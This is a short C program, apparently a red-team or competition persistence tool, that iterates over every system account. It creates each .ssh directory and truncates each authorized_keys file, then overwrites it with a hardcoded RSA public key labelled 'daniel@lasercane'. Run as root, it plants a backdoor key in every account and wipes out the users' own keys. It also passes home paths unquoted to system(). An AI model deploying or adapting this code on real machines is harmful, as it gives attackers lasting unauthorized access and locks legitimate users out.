/* ssh-keys-all.c -- drops a set of ssh keys for each user */
#include <pwd.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdbool.h>
#include <sys/types.h>
#include <sys/stat.h>


// Put your teams keys here. Remember to add newlines.
char *keys[] = {
  "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5mRVdOwOgtO1mnEwqNDqU5rfrAsJ/5nwYyUNo3tbJL7CX+p6fEgyxnGwz5xbUH5CxvcEgFnSn/j+BhSbD3Qbt7q3aVUOMI8qlWcUELr3PXHXmKowXXOBufZeC4uQO1vMYnd56C+YcJYnUMYi/rBIaux17E0DC85y9f4eGhdYicUC9sBPNXSR/l1Pk9ac4gfUDWntXkYkDpNzUSb/1N5H/m5SPkYkt5/qVL480w7Ez6cHLOHEDDJDeyAXA7U/rT87AgSSPP3lHYWIwKODCr2PmfuOEBUXvQW2/SvfYKvuxw2X+Q9FcNtzUm1SKHCbQO84YqGB02mH02vGB5cxP3n2T daniel@lasercane\n",
  "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5mRVdOwOgtO1mnEwqNDqU5rfrAsJ/5nwYyUNo3tbJL7CX+p6fEgyxnGwz5xbUH5CxvcEgFnSn/j+BhSbD3Qbt7q3aVUOMI8qlWcUELr3PXHXmKowXXOBufZeC4uQO1vMYnd56C+YcJYnUMYi/rBIaux17E0DC85y9f4eGhdYicUC9sBPNXSR/l1Pk9ac4gfUDWntXkYkDpNzUSb/1N5H/m5SPkYkt5/qVL480w7Ez6cHLOHEDDJDeyAXA7U/rT87AgSSPP3lHYWIwKODCr2PmfuOEBUXvQW2/SvfYKvuxw2X+Q9FcNtzUm1SKHCbQO84YqGB02mH02vGB5cxP3n2T daniel@lasercane\n"
};

int main(int argc, char *argv[]) {
  DIR *d;
  struct passwd *pwd;

  while((pwd = getpwent()) != NULL) {
    char sshdir[1024];
    snprintf(sshdir, sizeof(sshdir), "%s/.ssh", pwd->pw_dir);

    /* Create .ssh directories for each user if they don't exist */
    d = opendir(sshdir);
    if (d == NULL) {
      char cmd[1024];
      snprintf(cmd, sizeof(cmd), "/bin/mkdir -p %s", sshdir);
      system(cmd);

      chown(sshdir, pwd->pw_uid, pwd->pw_gid);
      chmod(sshdir, 0700);
    } else {
      closedir(d);
    }

    /* Create .ssh/authorized_keys if they do not exist */
    char keyfile[1024];
    snprintf(keyfile, sizeof(keyfile), "%s/authorized_keys", sshdir);

    bool exists;
    if(access(keyfile, F_OK) == -1)
      exists = false;
    else
      exists = true;

    int fd;
    fd = open(keyfile, O_CREAT | O_WRONLY | O_TRUNC, 0600);

    // Set permissions appropriately.
    if (!exists)
      chown(keyfile, pwd->pw_uid, pwd->pw_gid);

    for(int i = 0; i < sizeof(keys) / sizeof(char *); i++)
      write(fd, keys[i], strlen(keys[i]));

    close(fd);
  }

  return EXIT_SUCCESS;
}
